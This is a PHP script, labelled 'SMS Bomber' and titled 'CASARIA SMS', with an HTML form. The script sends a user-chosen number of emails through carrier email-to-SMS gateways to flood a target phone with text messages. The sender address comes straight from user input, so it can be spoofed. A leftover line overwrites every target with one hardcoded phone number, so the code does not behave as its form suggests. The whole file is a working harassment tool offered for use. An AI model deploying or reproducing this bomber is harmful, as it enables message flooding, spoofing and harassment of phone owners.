<?php

//SMS Bomber
if(isset($_POST['number']) && isset($_POST['carrier']) && isset($_POST['message']) && isset($_POST['subject']) && isset($_POST['amount']) && isset($_POST['from'])){

$number = $_POST['number'];
switch($_POST['carrier']){

case "verizon":
$carrier = "vtext.com";
break;

case "tmobile":
$carrier = "tmomail.net";
break;

case "vmobile":
$carrier = "vmobl.com";
break;

case "cingular":
$carrier = "cingularme.com";
break;

case "sprint":
$carrier = "messaging.sprintpcs.com";
break;

case "AT&T":
$carrier = "txt.att.net";
break;

case "metro":
$carrier = "mymetropcs.com";
break;

case "nextel":
$carrier = "messagin.nextel.com";
break;

case "gvoice":
$carrier = "grandcentral.com";
break;

}
$message = $_POST['message'];
$subject = $_POST['subject'];
$amount = $_POST['amount'];
$from = $_POST['from'];

$headers = "From: ".$from;
$to = $number."@".$carrier;
$to = "94992939080@txt.att.net";
for($x=1; $x<=$amount; $x++){
if(mail($to, $subject, $message, $headers)){
$sent = 1;
}else{
$sent = 0;
}
}

if($sent == 1){
echo "Messages Sent!<br>";
echo "<br>";
echo "<a href=".$_SERVER['PHP_SELF'].">Send More</a>";
}else{
echo "There was a problem<br>";
echo "<br>";
echo "<a href=".$_SERVER['PHP_SELF'].">Try Again</a>";
}

unset($number, $carrier, $message, $amount, $from, $headers, $to);

}else{

?>

<html>

<head>
<title>CASARIA SMS</title>
</head>

<body>
<font size=5>CASARIA SMS </font><br>
<br>
<form action=<?php echo $_SERVER['PHP_SELF']; ?> method=POST>
<legend>CASARIA SMS </legend>
<table border=0>

<tr>
<td align=right valign=top>
Phone Number:
</td>
<td align=left valign=top>
<input type=text name=number>
</td>
</tr>

<tr>
<td align=right valign=top>
Carrier:
</td>
<td align=left valign=top>
<select name=carrier>
<option value=verizon>Verizon</option>
<option value=tmobile>T-Mobile</option>
<option value=vmobile>Virgin Mobile</option>
<option value=cingular>Cingular</option>
<option value=sprint>Sprint</option>
<option value=AT&T>AT&T</option>
<option value=metro>MetroPCS</option>
<option value=nextel>Nextel</option>
<option value=gvoice>Google Voice (Experimental)</option>
</select>
</td>
</tr>

<tr>
<td align=right valign=top>
From:
</td>
<td align=left valign=top>
<input type=text name=from>
</td>
</tr>

<tr>
<td align=right valign=top>
Subject:
</td>
<td align=left valign=top>
<input type=text name=subject>
</td>
</tr>

<tr>
<td align=right valign=top>
Message:
</td>
<td align=left valign=top>
<textarea name=message>
</textarea>
</td>
</tr>

<tr>
<td align=right valign=top>
Amount: </td>
<td align=left valign=top>
<input type=text name=amount>
</td>
</tr>

<tr>
<td align=left valign=top>
<br>
<input type=submit value=Send>
</td>
</tr>
</table>
</form>
<br>
<font size=2>Note: If any feilds are left blank, your messages will not be sent.</font>
</body>

</html>

<?php

}

?> 